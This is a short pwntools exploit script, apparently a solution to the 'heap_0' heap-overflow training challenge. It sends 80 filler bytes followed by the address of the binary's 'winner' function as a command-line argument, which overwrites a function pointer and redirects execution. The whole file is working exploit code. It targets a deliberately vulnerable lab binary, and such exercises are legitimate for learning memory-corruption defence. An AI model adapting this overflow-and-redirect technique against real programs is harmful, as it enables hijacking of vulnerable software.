from pwn import *

# Set up pwntools for the correct architecture
context(arch='i386', os='linux')
elf = context.binary = ELF('heap_0')

# Function to start the exploit against the target
def start(payload, *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path, payload], gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path, payload], *a, **kw)

# Specify GDB script for debugging
gdbscript = '''
b main
continue
'''
# Create the payload with 80 bytes of 'A' and the address of 'winner'
payload = b"A" * 0x50 + p32(elf.symbols['winner'])

print("Using Payload:", payload)
print("Payload Length:", len(payload))

# Start the process with the payload as a command-line argument
io = start(payload)

# Interact with the process
io.interactive()
